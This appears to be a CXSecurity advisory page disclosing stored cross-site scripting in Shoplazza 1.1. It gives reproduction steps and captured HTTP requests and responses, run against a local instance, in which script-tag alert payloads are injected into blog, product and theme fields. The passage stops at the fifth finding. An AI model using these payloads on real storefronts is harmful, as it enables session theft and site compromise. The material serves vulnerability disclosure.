---
title: Shoplazza 1.1 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2022120032
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-17
fetch_date: 2025-10-04T01:43:55.738444
---

# Shoplazza 1.1 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Shoplazza 1.1 Cross Site Scripting** **2022.12.16**  Credit:  **[Andrey Stoykov](https://cxsecurity.com/author/Andrey%2BStoykov/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: Shoplazza 1.1 - Stored Cross Site Scripting
# Exploit Author: Andrey Stoykov
# Software Link: https://github.com/Shoplazza/LifeStyle
# Version: 1.1
# Tested on: Ubuntu 20.04
Stored XSS #1:
To reproduce do the following:
1. Login as normal user account
2. Browse "Blog Posts" -> "Manage Blogs" -> "Add Blog Post"
3. Select "Title" and enter payload "><script>alert(1)</script>
// HTTP POST request showing XSS payload
PATCH /admin/api/admin/articles/2dc688b1-ac9e-46d7-8e56-57ded1d45bf5 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
[...]
{"article":{"id":"2dc688b1-ac9e-46d7-8e56-57ded1d45bf5","title":"Title\"><script>alert(1)</script>","excerpt":"Excerpt\"><script>alert(2)</script>","content":"<p>\"&gt;&lt;script&gt;alert(3)&lt;/script&gt;</p>"[...]
// HTTP response showing unsanitized XSS payload
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
[...]
{"article":{"title":"Title\"><script>alert(1)</script>","excerpt":"Excerpt\"><script>alert(2)</script>","published":true,"seo\_title":"Title\"><script>alert(1)</script>"[...]
// HTTP GET request to trigger XSS payload
GET /blog/titlescriptalert1script?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NzAzMzE5MzYsInN0b3JlX2lkIjo1MTA0NTksInVzZXJfaWQiOiI4NGY4Nzk4ZC03ZGQ1LTRlZGMtYjk3Yy02MWUwODk5ZjM2MDgifQ.9ybPJCtv6Lzf1BlDy-ipoGpXajtl75QdUKEnfj9L49I HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
[...]
// HTTP response showing unsanitized XSS payload
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
[...]
<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<title>Title"><script>alert(1)</script></title>
<meta name="keywords" content="test1205">
[...]
Stored XSS #2:
To reproduce do the following:
1. Login as normal user account
2. Browse "Products" -> "Create Product"
3. Select "Subtitle" and enter payload "><script>alert(1)</script>
// HTTP POST request showing XSS payload
POST /admin/api/admin/v2\_products HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
[...]
{"product":{"id":"","title":"Title","brief":"Subtitle\"><script>alert(1)</script>","description":"<p>Description</p>"[...]
// HTTP response showing unsanitized XSS payload
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
[...]
{"product":{"brief":"Subtitle\"\u003e\u003cscript\u003ealert(1)\u003c/script\u003e","category\_id":"","collections
[...]
Stored XSS #3:
To reproduce do the following:
1. Login as normal user account
2. Browse "Online Store" -> "Themes" -> "Customize" -> "Announcement"
3. Select "Text" section and enter payload "><script>alert(1)</script>
4. Select "Mobile Text" section and enter payload "><script>alert(1)</script>
// HTTP POST request showing XSS payload
PATCH /admin/api/theme-edit/442430617951435468/temp-template-datas/061cf44d-f20e-42f4-9cde-54a74f240fef/sections/announcement HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
// HTTP response showing unsanitized XSS payload
{"section":{"type":"announcement","settings":{"enable\_view\_all":true},"blocks":[{"type":"announcement","settings":{"text":"Announcement\"><script>alert('Announcement')</script>","mobile\_text":"Mobile Text\"><script>alert('Mobile Text')</script>\n","countdown\_time":1,"link":null,"link\_text":"Shop now"}},{"type":"announcement","settings":{"text":"Welcome to our store","mobile\_text":"Welcome to our store","countdown\_time":1,"link":null,"link\_text":"Shop [...]
Stored XSS #4:
1. Login as normal user account
2. Browse "Online Store" -> "Themes" -> "Customize" -> "Product"
3. Select "Subheading" and enter payload "><script>alert(1)</script>
3. Select "Heading" and enter payload "><script>alert(1)</script>
4. Select "Text" and enter payload "><script>alert(1)</script>
5. Select "Button Text" and enter payload "><script>alert(1)</script>
6. Select "Label" and enter payload "><script>alert(1)</script>
// HTTP POST request showing XSS payload
PATCH /admin/api/theme-edit/442439399796402892/temp-template-datas/2f973e0e-6711-4e5f-8f55-8f34b4bdbd31/sections/1664528667835 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
[...]
{"section":{"name":"feature\_product","cname":{"en-US":"Feature Product","zh-CN":""},"category":{"en-US":"Promotion","zh-CN":""},"ccategory":{"en-US":"Promotion","zh-CN":""},"display":true,"blocks":[{"type":"Product","settings":{"auto\_display":true,"subheading":"Products\"><script>alert('Product')</script>","heading":"Product\_Subheading\"><script>alert('Product\_Subheading')</script>","text":"Product\_Text\"><script>alert('Product\_Text')</script>","btn\_text":"Button\_Text\"><script>alert('Button\_Text')</script>","label\_text":"Label\_Text\"><script>alert('Label\_Text')</script>",
[...]
// HTTP response showing unsanitized XSS payload
HTTP/1.1 200 OK
Content-Type: application/json; charset=UTF-8
[...]
{"section":{"name":"feature\_product","cname":{"en-US":"Feature Product","zh-CN":""},"category":{"en-US":"Promotion","zh-CN":""},"ccategory":{"en-US":"Promotion","zh-CN":""},"display":true,"blocks":[{"type":"Product","settings":{"auto\_display":true,"subheading":"Products\"><script>alert('Product')</script>","heading":"Product\_Subheading\"><script>alert('Product\_Subheading')</script>","text":"Product\_Text\"><script>alert('Product\_Text')</script>","btn\_text":"Button\_Text\"><script>alert('Button\_Text')</script>","label\_text":"Label\_Text\"><script>alert('Label\_Text')</script>"
[...]
Stored XSS #5:
1. Login as normal user acco...